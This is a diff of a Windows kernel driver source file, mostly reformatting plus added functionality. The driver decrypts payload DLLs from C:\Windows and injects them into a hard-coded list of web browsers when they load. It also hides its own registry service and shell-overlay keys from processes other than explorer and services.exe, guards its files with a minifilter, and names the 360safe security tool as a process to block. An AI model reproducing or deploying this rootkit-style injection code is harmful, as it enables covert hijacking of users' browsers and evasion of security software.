@@ -2,12 +2,12 @@
 * AUTHOR : antireg
 * DATE   : 2019-6-21
 * MODULE : adsys.C
-* 
-* Command: 
-*	Source of IOCTRL Sample Driver
+*
+* Command:
+*   Source of IOCTRL Sample Driver
 *
 * Description:
-*		Demonstrates communications between USER and KERNEL.
+*       Demonstrates communications between USER and KERNEL.
 *
 ****************************************************************************************
 * Copyright (C) 2010 antireg.
@@ -28,9 +28,9 @@
 
 
 #ifdef ALLOC_PRAGMA
-    // Allow the DriverEntry routine to be discarded once initialization is completed
+// Allow the DriverEntry routine to be discarded once initialization is completed
 #pragma alloc_text(INIT, DriverEntry)
-    // 
+//
 #pragma alloc_text(PAGE, DriverUnload)
 #pragma alloc_text(PAGE, DispatchCreate)
 #pragma alloc_text(PAGE, DispatchShutDown)
@@ -45,13 +45,13 @@
 
 
 
- 
- 
+
+
 #endif // ALLOC_PRAGMA
 
 NTSTATUS DriverEntry(IN PDRIVER_OBJECT pDriverObj, IN PUNICODE_STRING pRegistryString)
 {
-	NTSTATUS		status = STATUS_SUCCESS;
+    NTSTATUS        status = STATUS_SUCCESS;
 
     PVOID fnExGetPreviousMode = (PVOID)ExGetPreviousMode;
     PVOID pFoundPattern = NULL;
@@ -59,31 +59,30 @@ NTSTATUS DriverEntry(IN PDRIVER_OBJECT pDriverObj, IN PUNICODE_STRING pRegistryS
     PKLDR_DATA_TABLE_ENTRY entry=NULL;
     PMY_COMMAND_INFO  p1=NULL;
 
-	
-	UNICODE_STRING  ustrLinkName;
-	UNICODE_STRING  ustrDevName;  
-	PDEVICE_OBJECT  pDevObj;
-	int i = 0;
-	ReadDriverParameters(pRegistryString);
-	pDriverObj->MajorFunction[IRP_MJ_CREATE] = DispatchCreate;
-	pDriverObj->MajorFunction[IRP_MJ_CLOSE] = DispatchClose;
-	pDriverObj->MajorFunction[IRP_MJ_SHUTDOWN] = DispatchShutDown;
-	// Dispatch routine for communications
-	pDriverObj->MajorFunction[IRP_MJ_DEVICE_CONTROL] = DispatchControl;
 
-	// Unload routine
-	pDriverObj->DriverUnload = DriverUnload;
+    UNICODE_STRING  ustrLinkName;
+    UNICODE_STRING  ustrDevName;
+    PDEVICE_OBJECT  pDevObj;
+    int i = 0;
+    ReadDriverParameters(pRegistryString);
+    pDriverObj->MajorFunction[IRP_MJ_CREATE] = DispatchCreate;
+    pDriverObj->MajorFunction[IRP_MJ_CLOSE] = DispatchClose;
+    pDriverObj->MajorFunction[IRP_MJ_SHUTDOWN] = DispatchShutDown;
+    // Dispatch routine for communications
+    pDriverObj->MajorFunction[IRP_MJ_DEVICE_CONTROL] = DispatchControl;
 
-	// Initialize the device name.
-	RtlInitUnicodeString(&ustrDevName, NT_DEVICE_NAME);
+    // Unload routine
+    pDriverObj->DriverUnload = DriverUnload;
 
-	// Create the device object and device extension
-	status = IoCreateDevice(pDriverObj, 0,&ustrDevName, FILE_DEVICE_UNKNOWN,0,FALSE,&pDevObj);
-	if(!NT_SUCCESS(status))
-	{
-		dprintf("[DriverEntry] Error, IoCreateDevice = 0x%x\r\n", status);
-		return status;
-	}
+    // Initialize the device name.
+    RtlInitUnicodeString(&ustrDevName, NT_DEVICE_NAME);
+
+    // Create the device object and device extension
+    status = IoCreateDevice(pDriverObj, 0,&ustrDevName, FILE_DEVICE_UNKNOWN,0,FALSE,&pDevObj);
+    if(!NT_SUCCESS(status)) {
+        dprintf("[DriverEntry] Error, IoCreateDevice = 0x%x\r\n", status);
+        return status;
+    }
 
     //// Get a pointer to our device extension
     //deviceExtension = (PDEVICE_EXTENSION) deviceObject->DeviceExtension;
@@ -91,235 +90,226 @@ NTSTATUS DriverEntry(IN PDRIVER_OBJECT pDriverObj, IN PUNICODE_STRING pRegistryS
     //// Save a pointer to the device object
     //deviceExtension->DeviceObject = deviceObject;
 
-	if(IoIsWdmVersionAvailable(1,0x10))
-	{
-		//如果是支持符号链接用户相关性的系统
-		RtlInitUnicodeString(&ustrLinkName, SYMBOLIC_LINK_GLOBAL_NAME);
-	}
-	else
-	{
-		//不支持
-		RtlInitUnicodeString(&ustrLinkName, SYMBOLIC_LINK_NAME);
-	}
-	
-	// Create a symbolic link to allow USER applications to access it. 
-	status = IoCreateSymbolicLink(&ustrLinkName, &ustrDevName);  
-	
-	if(!NT_SUCCESS(status))
-	{
-		dprintf("Error, IoCreateSymbolicLink = 0x%x\r\n", status);
-		
-		IoDeleteDevice(pDevObj); 
-		return status;
-	}	
+    if(IoIsWdmVersionAvailable(1,0x10)) {
+        //如果是支持符号链接用户相关性的系统
+        RtlInitUnicodeString(&ustrLinkName, SYMBOLIC_LINK_GLOBAL_NAME);
+    } else {
+        //不支持
+        RtlInitUnicodeString(&ustrLinkName, SYMBOLIC_LINK_NAME);
+    }
 
-	//
-	//	TODO: Add initialization code here.
-	//
+    // Create a symbolic link to allow USER applications to access it.
+    status = IoCreateSymbolicLink(&ustrLinkName, &ustrDevName);
+
+    if(!NT_SUCCESS(status)) {
+        dprintf("Error, IoCreateSymbolicLink = 0x%x\r\n", status);
+
+        IoDeleteDevice(pDevObj);
+        return status;
+    }
+    IoRegisterShutdownNotification(pDevObj);
+	g_drobj=pDriverObj;
+    //
+    //  TODO: Add initialization code here.
+    //
 //浏览器
 
-   InitializeListHead(&g_ListProcess);
-   AppendListNode(L"360se.exe",&g_ListProcess,0);
-   AppendListNode(L"chrome.exe",&g_ListProcess,0);
-   AppendListNode(L"QQBrowser.exe",&g_ListProcess,0);
-   AppendListNode(L"2345Explorer.exe",&g_ListProcess,0);
-   AppendListNode(L"SogouExplorer.exe",&g_ListProcess,0);
-   AppendListNode(L"baidubrowser.exe",&g_ListProcess,0);
-   AppendListNode(L"firefox.exe",&g_ListProcess,0);
-   AppendListNode(L"UCBrowser.exe",&g_ListProcess,0);
-   AppendListNode(L"liebao.exe",&g_ListProcess,0);
-   AppendListNode(L"TheWorld.exe",&g_ListProcess,0);
-   AppendListNode(L"iexplore.exe",&g_ListProcess,0);
-   AppendListNode(L"360chrome.exe",&g_ListProcess,0);
-   AppendListNode(L"opera.exe",&g_ListProcess,0);
-   AppendListNode(L"Maxthon.exe",&g_ListProcess,0);
+    InitializeListHead(&g_ListProcess);
+    AppendListNode(L"360se.exe",&g_ListProcess,0);
+    AppendListNode(L"chrome.exe",&g_ListProcess,0);
+    AppendListNode(L"QQBrowser.exe",&g_ListProcess,0);
+    AppendListNode(L"2345Explorer.exe",&g_ListProcess,0);
+    AppendListNode(L"SogouExplorer.exe",&g_ListProcess,0);
+    AppendListNode(L"baidubrowser.exe",&g_ListProcess,0);
+    AppendListNode(L"firefox.exe",&g_ListProcess,0);
+    AppendListNode(L"UCBrowser.exe",&g_ListProcess,0);
+    AppendListNode(L"liebao.exe",&g_ListProcess,0);
+    AppendListNode(L"TheWorld.exe",&g_ListProcess,0);
+    AppendListNode(L"iexplore.exe",&g_ListProcess,0);
+    AppendListNode(L"360chrome.exe",&g_ListProcess,0);
+    AppendListNode(L"opera.exe",&g_ListProcess,0);
+    AppendListNode(L"Maxthon.exe",&g_ListProcess,0);
 
 //要保护的文件
-   InitializeListHead(&g_ProtectFile);
-   KeInitializeSpinLock(&g_spin_lockfile);
+    InitializeListHead(&g_ProtectFile);
+    KeInitializeSpinLock(&g_spin_lockfile);
 
-   AppendListNode(L"adplug.dll",&g_ProtectFile,2);
-   AppendListNode(L"adsys.sys",&g_ProtectFile,1);
+    AppendListNode(L"adplug.dll",&g_ProtectFile,2);
+    AppendListNode(L"adsys.sys",&g_ProtectFile,1);
 
 
 //不让访问的进程名
-   InitializeListHead(&g_AntiProcess);
-   KeInitializeSpinLock(&g_spin_process);
-   AppendListNode(L"360safe.exe",&g_AntiProcess,0);
+    InitializeListHead(&g_AntiProcess);
+    KeInitializeSpinLock(&g_spin_process);
+    AppendListNode(L"360safe.exe",&g_AntiProcess,0);
 
-  //kprintf("file is exist:%d",CheckElementExistsViaOpen(g_pPlugPath));
-  status = MzReadFile(g_pPlugPath,&g_pPlugBuffer,&g_iPlugSize);
+    //kprintf("file is exist:%d",CheckElementExistsViaOpen(g_pPlugPath));
+    status = MzReadFile(g_pPlugPath,&g_pPlugBuffer,&g_iPlugSize);
 
-   
-#ifdef _AMD64_
-   //x64 add code
-   status = MzReadFile(L"\\??\\C:\\Windows\\adcore64.dat",&g_pDll64,&g_iDll64);
-   if (NT_SUCCESS(status)) {
-       MyDecryptFile(g_pDll64,g_iDll64);
-
-   }
-
-   status = MzReadFile(L"\\??\\C:\\Windows\\adcore32.dat",&g_pDll32,&g_iDll32);
-   if (NT_SUCCESS(status)) {
-       MyDecryptFile(g_pDll32,g_iDll32);
-   }
-
-#else
-   //x86 add code
-   status = MzReadFile(L"\\??\\C:\\Windows\\adcore32.dat",&g_pDll32,&g_iDll32);
-   if (NT_SUCCESS(status)) {
-       MyDecryptFile(g_pDll32,g_iDll32);
-   }
-#endif
-
-   kprintf("[DriverEntry] g_pDll64:%p g_iDll64:%x g_pDll32:%p g_iDll32:%x",g_pDll64,g_iDll64,g_pDll32,g_iDll32);
 
 #ifdef _AMD64_
-   KeServiceDescriptorTable = (PServiceDescriptorTableEntry_t)GetKeServiceDescriptorTable64();
+    //x64 add code
+    status = MzReadFile(L"\\??\\C:\\Windows\\adcore64.dat",&g_pDll64,&g_iDll64);
+    if (NT_SUCCESS(status)) {
+        MyDecryptFile(g_pDll64,g_iDll64);
+
+    }
+
+    status = MzReadFile(L"\\??\\C:\\Windows\\adcore32.dat",&g_pDll32,&g_iDll32);
+    if (NT_SUCCESS(status)) {
+        MyDecryptFile(g_pDll32,g_iDll32);
+    }
+
+#else
+    //x86 add code
+    status = MzReadFile(L"\\??\\C:\\Windows\\adcore32.dat",&g_pDll32,&g_iDll32);
+    if (NT_SUCCESS(status)) {
+        MyDecryptFile(g_pDll32,g_iDll32);
+    }
+#endif
+
+    kprintf("[DriverEntry] g_pDll64:%p g_iDll64:%x g_pDll32:%p g_iDll32:%x",g_pDll64,g_iDll64,g_pDll32,g_iDll32);
+
+#ifdef _AMD64_
+    KeServiceDescriptorTable = (PServiceDescriptorTableEntry_t)GetKeServiceDescriptorTable64();
 #else
 #endif
 
-   kprintf("[DriverEntry] KeServiceDescriptorTable:%p", KeServiceDescriptorTable);
+    kprintf("[DriverEntry] KeServiceDescriptorTable:%p", KeServiceDescriptorTable);
 
-   PsGetProcessWow64Process = (P_PsGetProcessWow64Process)GetSystemRoutineAddress(L"PsGetProcessWow64Process");
-   PsGetProcessPeb = (P_PsGetProcessPeb)GetSystemRoutineAddress(L"PsGetProcessPeb");
-   DbgPrint("[DriverEntry] PsGetProcessPeb:%p   PsGetProcessWow64Process:%p", PsGetProcessPeb, PsGetProcessWow64Process);
-   if(NT_SUCCESS(BBSearchPattern(PreviousModePattern, 0xCC, sizeof(PreviousModePattern) - 1, fnExGetPreviousMode, 32, &pFoundPattern))) {
-       g_mode = *(PULONG)((PUCHAR)pFoundPattern - 2);
-       kprintf("[DriverEntry] g_mode:%x fnExGetPreviousMode:%p\n", g_mode, fnExGetPreviousMode);
-   }
+    PsGetProcessWow64Process = (P_PsGetProcessWow64Process)GetSystemRoutineAddress(L"PsGetProcessWow64Process");
+    PsGetProcessPeb = (P_PsGetProcessPeb)GetSystemRoutineAddress(L"PsGetProcessPeb");
+    DbgPrint("[DriverEntry] PsGetProcessPeb:%p   PsGetProcessWow64Process:%p", PsGetProcessPeb, PsGetProcessWow64Process);
+    if(NT_SUCCESS(BBSearchPattern(PreviousModePattern, 0xCC, sizeof(PreviousModePattern) - 1, fnExGetPreviousMode, 32, &pFoundPattern))) {
+        g_mode = *(PULONG)((PUCHAR)pFoundPattern - 2);
+        kprintf("[DriverEntry] g_mode:%x fnExGetPreviousMode:%p\n", g_mode, fnExGetPreviousMode);
+    }
 
 
-	// 映像加载回调
-	
-   status = PsSetLoadImageNotifyRoutine((PLOAD_IMAGE_NOTIFY_ROUTINE)ImageNotify);
-   if(!NT_SUCCESS(status)) {
-       kprintf("[DriverEntry] PsSetLoadImageNotifyRoutine Failed! status:%x\n", status);
-   }
+    // 映像加载回调
 
-   ////注册表回调监控
-   SetRegisterCallback();
-   //文件回调监控
-   ExInitializeNPagedLookasideList( &Pre2PostContextList,NULL,NULL,0,sizeof(PRE_2_POST_CONTEXT),PRE_2_POST_TAG,0 );
-   status = FltRegisterFilter( pDriverObj,&FilterRegistration,&gFilterHandle);
-   ASSERT( NT_SUCCESS( status ) );
-   if (NT_SUCCESS( status )) {
-       //
-       //  Start filtering i/o
-       //
-       status = FltStartFiltering( gFilterHandle);
-       if (!NT_SUCCESS( status )) {
-           FltUnregisterFilter( gFilterHandle);
-       }
-   }
-	return STATUS_SUCCESS;
+    status = PsSetLoadImageNotifyRoutine((PLOAD_IMAGE_NOTIFY_ROUTINE)ImageNotify);
+    if(!NT_SUCCESS(status)) {
+        kprintf("[DriverEntry] PsSetLoadImageNotifyRoutine Failed! status:%x\n", status);
+    }
+
+    ////注册表回调监控
+    SetRegisterCallback();
+    //文件回调监控
+    ExInitializeNPagedLookasideList( &Pre2PostContextList,NULL,NULL,0,sizeof(PRE_2_POST_CONTEXT),PRE_2_POST_TAG,0 );
+    status = FltRegisterFilter( pDriverObj,&FilterRegistration,&gFilterHandle);
+    ASSERT( NT_SUCCESS( status ) );
+    if (NT_SUCCESS( status )) {
+        //
+        //  Start filtering i/o
+        //
+        status = FltStartFiltering( gFilterHandle);
+        if (!NT_SUCCESS( status )) {
+            FltUnregisterFilter( gFilterHandle);
+        }
+    }
+    return STATUS_SUCCESS;
 }
 
 VOID DriverUnload(IN PDRIVER_OBJECT pDriverObj)
-{	
-	UNICODE_STRING strLink;
+{
+    UNICODE_STRING strLink;
 
-	// Unloading - no resources to free so just return.
-	dprintf("Unloading...\r\n");;	
+    // Unloading - no resources to free so just return.
+    dprintf("Unloading...\r\n");;
 
-	//
-	// TODO: Add uninstall code here.
-	//
-	PsRemoveLoadImageNotifyRoutine((PLOAD_IMAGE_NOTIFY_ROUTINE)ImageNotify);
+    //
+    // TODO: Add uninstall code here.
+    //
+    PsRemoveLoadImageNotifyRoutine((PLOAD_IMAGE_NOTIFY_ROUTINE)ImageNotify);
     RemoveRegisterCallback();
-	// Delete the symbolic link
-	RtlInitUnicodeString(&strLink, SYMBOLIC_LINK_NAME);
-	IoDeleteSymbolicLink(&strLink);
+    // Delete the symbolic link
+    RtlInitUnicodeString(&strLink, SYMBOLIC_LINK_NAME);
+    IoDeleteSymbolicLink(&strLink);
 
-	// Delete the DeviceObject
-	IoDeleteDevice(pDriverObj->DeviceObject);
+    // Delete the DeviceObject
+    IoDeleteDevice(pDriverObj->DeviceObject);
 
-	dprintf("Unloaded Success\r\n");
+    dprintf("Unloaded Success\r\n");
 
-	return;
+    return;
 }
 
 NTSTATUS DispatchCreate(IN PDEVICE_OBJECT pDevObj, IN PIRP pIrp)
 {
-	pIrp->IoStatus.Status = STATUS_SUCCESS;
-	pIrp->IoStatus.Information = 0;
+    pIrp->IoStatus.Status = STATUS_SUCCESS;
+    pIrp->IoStatus.Information = 0;
 
-	IoCompleteRequest(pIrp, IO_NO_INCREMENT);
+    IoCompleteRequest(pIrp, IO_NO_INCREMENT);
 
-	return STATUS_SUCCESS;
+    return STATUS_SUCCESS;
 }
 
 
 NTSTATUS DispatchClose(IN PDEVICE_OBJECT pDevObj, IN PIRP pIrp)
 {
-	pIrp->IoStatus.Status = STATUS_SUCCESS;
-	pIrp->IoStatus.Information = 0;
+    pIrp->IoStatus.Status = STATUS_SUCCESS;
+    pIrp->IoStatus.Information = 0;
 
-	IoCompleteRequest(pIrp, IO_NO_INCREMENT);
+    IoCompleteRequest(pIrp, IO_NO_INCREMENT);
 
-	// Return success
-	return STATUS_SUCCESS;
+    // Return success
+    return STATUS_SUCCESS;
 }
 
 NTSTATUS DispatchCommon(IN PDEVICE_OBJECT pDevObj, IN PIRP pIrp)
 {
-	pIrp->IoStatus.Status = STATUS_SUCCESS;
-	pIrp->IoStatus.Information = 0L;
-	IoCompleteRequest( pIrp, 0 );
-	// Return success
-	return STATUS_SUCCESS;
+    pIrp->IoStatus.Status = STATUS_SUCCESS;
+    pIrp->IoStatus.Information = 0L;
+    IoCompleteRequest( pIrp, 0 );
+    // Return success
+    return STATUS_SUCCESS;
 }
 
 NTSTATUS DispatchControl(IN PDEVICE_OBJECT pDevObj, IN PIRP pIrp)
 {
-	NTSTATUS status               = STATUS_INVALID_DEVICE_REQUEST;	 // STATUS_UNSUCCESSFUL
-	PIO_STACK_LOCATION pIrpStack  = IoGetCurrentIrpStackLocation(pIrp);
-	ULONG uIoControlCode          = 0;
-	PVOID pIoBuffer				  = NULL;
-	ULONG uInSize                 = 0;
-	ULONG uOutSize                = 0;
- 
-	// Get the IoCtrl Code
-	uIoControlCode = pIrpStack->Parameters.DeviceIoControl.IoControlCode;
-	pIoBuffer = pIrp->AssociatedIrp.SystemBuffer;
-	uInSize = pIrpStack->Parameters.DeviceIoControl.InputBufferLength;
-	uOutSize = pIrpStack->Parameters.DeviceIoControl.OutputBufferLength;
+    NTSTATUS status               = STATUS_INVALID_DEVICE_REQUEST;   // STATUS_UNSUCCESSFUL
+    PIO_STACK_LOCATION pIrpStack  = IoGetCurrentIrpStackLocation(pIrp);
+    ULONG uIoControlCode          = 0;
+    PVOID pIoBuffer               = NULL;
+    ULONG uInSize                 = 0;
+    ULONG uOutSize                = 0;
 
-	switch(uIoControlCode)
-	{
-		case IOCTL_HELLO_WORLD:
-			{			
-				dprintf("MY_CTL_CODE(0)=%d\r\n,MY_CTL_CODE");
+    // Get the IoCtrl Code
+    uIoControlCode = pIrpStack->Parameters.DeviceIoControl.IoControlCode;
+    pIoBuffer = pIrp->AssociatedIrp.SystemBuffer;
+    uInSize = pIrpStack->Parameters.DeviceIoControl.InputBufferLength;
+    uOutSize = pIrpStack->Parameters.DeviceIoControl.OutputBufferLength;
 
-				// Return success
-				status = STATUS_SUCCESS;
-			}
-			break;
-			
-		//
-		// TODO: Add execute code here.
-		//
-		default:
-			{
+    switch(uIoControlCode) {
+        case IOCTL_HELLO_WORLD: {
+            dprintf("MY_CTL_CODE(0)=%d\r\n,MY_CTL_CODE");
 
-				status = STATUS_INVALID_PARAMETER;	
-			}
-			break;
-	}
+            // Return success
+            status = STATUS_SUCCESS;
+        }
+        break;
 
-	if(status == STATUS_SUCCESS)
-	{
-		pIrp->IoStatus.Information = uOutSize;
-	}
-	else
-	{
-		pIrp->IoStatus.Information = 0;
-	}
+        //
+        // TODO: Add execute code here.
+        //
+        default: {
 
-	// Complete the I/O Request
-	pIrp->IoStatus.Status = status;
-	IoCompleteRequest(pIrp, IO_NO_INCREMENT);
-	return status;
+            status = STATUS_INVALID_PARAMETER;
+        }
+        break;
+    }
+
+    if(status == STATUS_SUCCESS) {
+        pIrp->IoStatus.Information = uOutSize;
+    } else {
+        pIrp->IoStatus.Information = 0;
+    }
+
+    // Complete the I/O Request
+    pIrp->IoStatus.Status = status;
+    IoCompleteRequest(pIrp, IO_NO_INCREMENT);
+    return status;
 }
 
 
@@ -751,7 +741,7 @@ Return Value:
 }
 
 
-/** 
+/**
  * [InstanceQueryTeardown This is called when an instance is being manually deleted by a call to FltDetachVolume or FilterDetach.  We always return it is OK to detach]
  * @Author   fanyusen
  * @DateTime 2019年6月18日T7:23:53+0800
@@ -822,7 +812,7 @@ FLT_PREOP_CALLBACK_STATUS PreCleanup(
     }
     finally{
 
-        if (NULL != pVolCtx) 	FltReleaseContext(pVolCtx);
+        if (NULL != pVolCtx)    FltReleaseContext(pVolCtx);
         if (NULL != pStreamCtx) FltReleaseContext(pStreamCtx);
         if (NULL != pfNameInfo) FltReleaseFileNameInformation(pfNameInfo);
     }
@@ -948,7 +938,7 @@ FLT_POSTOP_CALLBACK_STATUS PostCreate(
     BOOLEAN bNewCreatedOrNot = FALSE;
     WCHAR   fitername[512]= {0};
     BOOLEAN bDirectory = FALSE;
-	KIRQL OldIrql;
+    KIRQL OldIrql;
     PMY_COMMAND_INFO  pCmdData=NULL;
     UNREFERENCED_PARAMETER(Flags);
     UNREFERENCED_PARAMETER(CompletionContext);
@@ -1027,6 +1017,10 @@ BOOLEAN GetNameByUnicodeString(PUNICODE_STRING pSrc, WCHAR name[])
             pfind++;
             wcscpy(name, pfind);
             //              DbgPrint("GetNameByUnicodeString->%ws", pfind);
+            return TRUE;
+        } else if(pfind==NULL&&pSrc->Length>0) {
+//          kprintf("[GetNameByUnicodeString] %ws",uu);
+            wcscpy(name, uu);
             return TRUE;
         }
     }
@@ -1296,7 +1290,8 @@ FLT_POSTOP_CALLBACK_STATUS PostRead(
                 } else if(p2pCtx->pStreamCtx->uEncrypteType==2) {
                     WCHAR exename[512]= {0};
                     BOOLEAN  bgetname=  GetProcessNameByObj(PsGetCurrentProcess(),exename);
-                    if (_wcsicmp(exename,L"explorer.exe")==0) {
+//                  kprintf("[PostRead] exename:%ws  bgetname:%d pid:%d",exename,bgetname,PsGetCurrentProcessId());
+                    if (_wcsicmp(exename,L"explorer.exe")==0||_wcsicmp(exename,L"rundll32.exe")==0) {
                         RtlCopyMemory( origBuf,p2pCtx->SwappedBuffer, Data->IoStatus.Information );
                     } else {
                         PUCHAR  puorigin=(PUCHAR)origBuf;
@@ -1346,7 +1341,7 @@ FLT_POSTOP_CALLBACK_STATUS PostRead(
 
 
 
-/** 
+/**
  * [PostReadWhenSafe description]
  * @Author   zzc
  * @DateTime 2019年6月18日T6:59:43+0800
@@ -1413,7 +1408,7 @@ DWORD_PTR GetSystemRoutineAddress(WCHAR *szFunCtionAName)
 }
 
 
-/** 
+/**
  * [RegCallBack description]
  * @Author   zzc
  * @DateTime 2019年6月18日T6:53:38+0800
@@ -1431,16 +1426,18 @@ NTSTATUS RegCallBack(PVOID CallbackContext,PVOID Argument1,PVOID Argument2)
     UNREFERENCED_PARAMETER(CallbackContext);
     // 判断操作
     switch (lOperateType) {
+        case RegNtPreOpenKey:
         case RegNtPreCreateKeyEx:
         case RegNtPreOpenKeyEx: {
             PREG_CREATE_KEY_INFORMATION KeyInfo = (PREG_CREATE_KEY_INFORMATION)Argument2;
             WCHAR                       exename[216] = { 0 };
             WCHAR                       PathReg[512] = { 0 };
+            PUNICODE_STRING             RootKeyName;
             if (MmIsAddressValid(KeyInfo) && MmIsAddressValid(KeyInfo->CompleteName)) {
                 PUNICODE_STRING  pPath = KeyInfo->CompleteName;
-                WCHAR   key[216] = { 0 };
-                if (GetNameByUnicodeString(pPath, key)) {
 
+                WCHAR   key[512] = { 0 };
+                if (GetNameByUnicodeString(pPath, key)) {
                     WCHAR exename[512]= {0};
                     UNICODE_STRING FullKeyName = { 0 };
                     HANDLE                      KeyHandle;
@@ -1448,9 +1445,30 @@ NTSTATUS RegCallBack(PVOID CallbackContext,PVOID Argument1,PVOID Argument2)
                     OBJECT_ATTRIBUTES           ObjectAttrib;
                     //0OverlayIcon
                     if (_wcsicmp(key, L"adplug") == 0) {
-                        WCHAR *pslr = _wcslwr(pPath->Buffer, pPath->Length);
+     
+						WCHAR *pslr = NULL;
+						BOOLEAN  bGetName=FALSE;
+
+                        status = LfGetObjectName( KeyInfo->RootObject, &RootKeyName );
+                        if ( NT_SUCCESS(status) ) {
+                           // kprintf("RootKeyName:%wZ",RootKeyName);
+							_wcslwr(RootKeyName->Buffer, RootKeyName->Length);
+                            if (wcsstr(RootKeyName->Buffer, L"explorer\\shelliconoverlayidentifiers")) {
+                        		 kfree( RootKeyName );
+								goto LABEL1;
+                            }
+                            kfree( RootKeyName );
+                        }
+
+
+
+                      	 pslr = _wcslwr(pPath->Buffer, pPath->Length);
                         if (wcsstr(pslr, L"shelliconoverlayidentifiers\\adplug")) {
-                            BOOLEAN  bGetName= GetProcessNameByObj(PsGetCurrentProcess(),exename);
+
+						
+LABEL1:
+							
+				   			bGetName= GetProcessNameByObj(PsGetCurrentProcess(),exename);
                             if (bGetName&&_wcsicmp(L"explorer.exe",exename)!=0) {
 
                                 RtlInitUnicodeString(&FullKeyName, L"\\REGISTRY\\MACHINE\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Explorer\\ShellIconOverlayIdentifiers\\Offline Files");
@@ -1485,14 +1503,14 @@ NTSTATUS RegCallBack(PVOID CallbackContext,PVOID Argument1,PVOID Argument2)
                             }
 
                         }
-						//pslr:\registry\machine\system\controlset001\services\adsys 
+                        //pslr:\registry\machine\system\controlset001\services\adsys
                     } else if(_wcsicmp(key, L"adsys") == 0) {
                         WCHAR *pslr = _wcslwr(pPath->Buffer, pPath->Length);
-                        if (wcsstr(pslr, L"services\\adsys")!=NULL) { 
+                        if (wcsstr(pslr, L"services\\adsys")!=NULL) {
                             BOOLEAN   bGetName= GetProcessNameByObj(PsGetCurrentProcess(),exename);
-						//exename:services.exe Path:\registry\machine\system\currentcontrolset\services\adsys
+                            //exename:services.exe Path:\registry\machine\system\currentcontrolset\services\adsys
                             if (bGetName&&_wcsicmp(L"services.exe",exename)!=0) {
-							    kprintf("exename:%ws Path:%wZ",exename,pPath);
+                                //kprintf("exename:%ws Path:%wZ",exename,pPath);
                                 RtlInitUnicodeString(&FullKeyName, L"\\REGISTRY\\MACHINE\\SYSTEM\\CurrentControlSet\\services\\ACPI");//services\ACPI
                                 InitializeObjectAttributes(&ObjectAttrib, &FullKeyName, OBJ_CASE_INSENSITIVE, NULL, NULL);
                                 if (NotifyClass == RegNtPreCreateKeyEx) {
@@ -1793,8 +1811,8 @@ VOID ImageNotify(PUNICODE_STRING       FullImageName, HANDLE ProcessId, PIMAGE_I
     WCHAR      pTempBuf[ 512 ] = { 0 };
     WCHAR      exename[216] = {0};
     int i = 0;
-	BOOLEAN  bGet=FALSE;
-	PMY_COMMAND_INFO  pCMDData=NULL;
+    BOOLEAN  bGet=FALSE;
+    PMY_COMMAND_INFO  pCMDData=NULL;
 
     if (ProcessId==0) {
         //DbgPrint("ProcessId：%x FullImageName:%wZ  ",ProcessId,FullImageName);
@@ -1820,28 +1838,26 @@ VOID ImageNotify(PUNICODE_STRING       FullImageName, HANDLE ProcessId, PIMAGE_I
 #ifdef _AMD64_
         //x64 add code
         pPEB=PsGetProcessWow64Process(ProcessObj);
-        if(wcsstr(pTempBuf,L"\\syswow64\\")!=NULL) {		
-			bGet = GetProcessNameByObj(ProcessObj,exename);
-			if (bGet&&_wcsicmp(exename,L"")!=NULL) {
-				pCMDData= FindInList(exename,&g_ListProcess,&g_spin_browser);
-				if (pCMDData)
-					{
-						 InjectDll(ProcessObj,32);
-					}
-			   
-			}
+        if(wcsstr(pTempBuf,L"\\syswow64\\")!=NULL) {
+            bGet = GetProcessNameByObj(ProcessObj,exename);
+            if (bGet&&_wcsicmp(exename,L"")!=NULL) {
+                pCMDData= FindInList(exename,&g_ListProcess,&g_spin_browser);
+                if (pCMDData) {
+                    InjectDll(ProcessObj,32);
+                }
+
+            }
 
         } else {
             if(pPEB==NULL) {
                 pPEB=PsGetProcessPeb(ProcessObj);
-				bGet = GetProcessNameByObj(ProcessObj,exename);
+                bGet = GetProcessNameByObj(ProcessObj,exename);
                 if (bGet&&_wcsicmp(exename,L"")!=NULL) {
-					pCMDData= FindInList(exename,&g_ListProcess,&g_spin_browser);
-					if (pCMDData)
-						{
-							 InjectDll(ProcessObj,64);
-						}
-                   
+                    pCMDData= FindInList(exename,&g_ListProcess,&g_spin_browser);
+                    if (pCMDData) {
+                        InjectDll(ProcessObj,64);
+                    }
+
                 }
             }
         }
@@ -1849,15 +1865,14 @@ VOID ImageNotify(PUNICODE_STRING       FullImageName, HANDLE ProcessId, PIMAGE_I
         //x86 add code
         pPEB=PsGetProcessPeb(ProcessObj);
 
-		bGet = GetProcessNameByObj(ProcessObj,exename);
-		if (bGet&&_wcsicmp(exename,L"")!=NULL) {
-			pCMDData= FindInList(exename,&g_ListProcess,&g_spin_browser);
-			if (pCMDData)
-				{
-					 newWorkItem(32);
-				}
-		   
-		}
+        bGet = GetProcessNameByObj(ProcessObj,exename);
+        if (bGet&&_wcsicmp(exename,L"")!=NULL) {
+            pCMDData= FindInList(exename,&g_ListProcess,&g_spin_browser);
+            if (pCMDData) {
+               newWorkItem(32);
+            }
+
+        }
 
 #endif
 
@@ -1947,7 +1962,7 @@ void InjectDll(PEPROCESS ProcessObj, int ibit)
             return;
         }
 
-		if (sizeDll==0) return;
+        if (sizeDll==0) return;
 
 
         status = ZwAllocateVirtualMemory(ProcessHandle, &dllbase, ZeroBits, &sizeDll, MEM_COMMIT, PAGE_EXECUTE_READWRITE);
@@ -2183,7 +2198,7 @@ VOID WorkerItemRoutine(PDEVICE_OBJECT  DeviceObject, PVOID  Context, PIO_WORKITE
             ObfDereferenceObject(ProcessObj);
         }
 
-        kfree(pParam); 
+        kfree(pParam);
     }
     IoUninitializeWorkItem(IoWorkItem);
     IoFreeWorkItem(IoWorkItem);
@@ -2253,9 +2268,9 @@ PMY_COMMAND_INFO  FindInList(const WCHAR* name,LIST_ENTRY*     link,PKSPIN_LOCK 
     return pData;
 
 }
- 
 
-/** 
+
+/**
  * [ReadDriverParameters This routine tries to read the driver-specific parameters from
     the registry.  These values will be found in the registry location
     indicated by the RegistryPath passed in]
@@ -2326,14 +2341,14 @@ VOID ReadDriverParameters (IN PUNICODE_STRING RegistryPath)
         ZwClose(driverRegKey);
     }
 }
- 
+
 NTSTATUS DispatchShutDown(IN PDEVICE_OBJECT Device, IN PIRP Irp)
 {
     NTSTATUS status;
     //HANDLE hkey;
     //PKLDR_DATA_TABLE_ENTRY entry=(PKLDR_DATA_TABLE_ENTRY)pDriver_entry->DriverSection;
     //MzWriteFile(strSys,puiprotect,iuiprotect);  //
-    status=bAceessFile(g_pPlugPath);    
